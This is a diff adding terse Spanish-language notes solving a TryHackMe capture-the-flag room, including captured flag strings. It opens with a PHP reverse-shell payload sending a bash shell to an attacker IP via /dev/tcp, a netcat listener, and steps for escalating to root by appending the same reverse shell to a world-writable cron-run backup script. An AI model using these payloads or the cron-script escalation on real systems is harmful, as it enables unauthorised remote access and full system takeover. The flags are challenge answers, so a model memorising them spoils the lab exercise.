@@ -1,0 +1,37 @@
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.101.74/1234 0>&1'");
+?>
+
+nc -nlvp 1234
+
+ip atacante: 10.2.101.74
+ip atacada: 10.10.245.108
+
+flag 1: THM{YmNlODZjN2I2ZDEwM2FlMDA5Y2RiYzZh}
+
+flag 2: THM{OWQyMGRlNWM0NjYzN2NmM2MxMDNkODgx}
+revisar ip:8002 -> try free lesson
+insertar reverse shell
+escuchar en el puerto asignado
+de ahi haces cd a home -> cd a serv3 -> cd a backups
+cat backup.sh
+cat /etc/crontab
+chmod 777 backup.sh
+activar otro listener en otra terminal
+echo "/bin/bash -c 'bash -i >& /dev/tcp/10.2.101.74/1234 0>&1'" >> backup.sh
+cd /root
+cat root.txt
+copiar bandera
+
+flag 3: THM{NGI4Nzk4OGI3MDE4NDUzNWYwNjMyZjY1}
+tras capturar la flag 2, en la misma terminal
+find / -type f -newermt "2021-02-15 19:00:00" ! -newermt "2021-02-16 20:00:00" ls 2>/dev/null
+cat /usr/games/fortune
+cat /var/lib/rary
+(en otra terminal) echo -n flag_encriptada = | base
+copiar bandera
+(use un decoder de base 64 en una pagina random de internet)
+
+flag 4: THM{Bet_You're_Glad_This_Is_Not_A_Hash}
+en la misma terminal donde esta hecha el echo"x" >> backup.sh
+THM{Bet_You're_Glad_This_Is_Not_A_Hash}
